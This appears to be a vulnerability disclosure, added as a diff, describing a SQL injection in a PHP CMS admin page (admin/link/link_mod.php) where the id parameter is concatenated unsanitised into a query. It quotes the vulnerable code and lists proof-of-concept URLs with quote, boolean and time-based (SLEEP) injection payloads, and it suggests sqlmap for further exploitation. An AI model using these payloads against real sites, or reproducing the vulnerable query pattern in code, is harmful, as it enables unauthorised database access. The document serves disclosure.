@@ -1,0 +1,30 @@
+affected source code file: /admin/link/link_mod.php
+--------------------------------
+affected source code:
+
+    ..... 
+    <?php
+        session_start();
+        require '../session.php'; 
+        include '../../inc/const.php';
+        include ("../../inc/editor/fckeditor.php");
+        $id= getvar('id');
+        $sqlstr=get_sql("select * from {pre}link where id=".$id);
+        $list=$db->getonerow($sqlstr);
+    ?>
+    ..... 
+     
+
+--------------------------------
+affected reason:
+      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/link/link_mod.php
+--------------------------------
+affected executable: 
+  After Signing in to the background in advance. Then: 
+  Like this: 
+             http://xx.xx.com/admin/link/link_mod.php?id=1'
+             http://xx.xx.com/admin/link/link_mod.php?id=1 and 1=1
+             http://xx.xx.com/admin/link/link_mod.php?id=1 and 1=2
+             http://xx.xx.com/admin/link/link_mod.php?id=1 RLIKE SLEEP(2)
+             
+Then, we can use tools like sqlmap for more information.
